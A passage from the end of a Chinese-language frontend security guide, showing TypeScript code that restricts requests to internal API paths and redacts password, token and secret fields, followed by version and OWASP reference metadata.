        if (!url.startsWith('/api/')) {
          throw new Error('只允许访问内部 API');
        }
        
        // 验证数据
        if (data && typeof data === 'object') {
          sanitizeData(data);
        }
        
        return fetch(url, {
          method: data ? 'POST' : 'GET',
          headers: { 'Content-Type': 'application/json' },
          credentials: 'include',
          body: data ? JSON.stringify(data) : undefined,
        });
      },
    };
  },
};

// 数据清理函数
function sanitizeData(data: Record<string, unknown>): void {
  const sensitiveFields = ['password', 'token', 'secret'];
  
  for (const key in data) {
    if (sensitiveFields.includes(key.toLowerCase())) {
      data[key] = '[REDACTED]';
    }
  }
}
```

---

**创建时间**：2026-05-21
**版本**：1.0
**维护者**：前端安全团队
**参考标准**：OWASP Top 10 2021
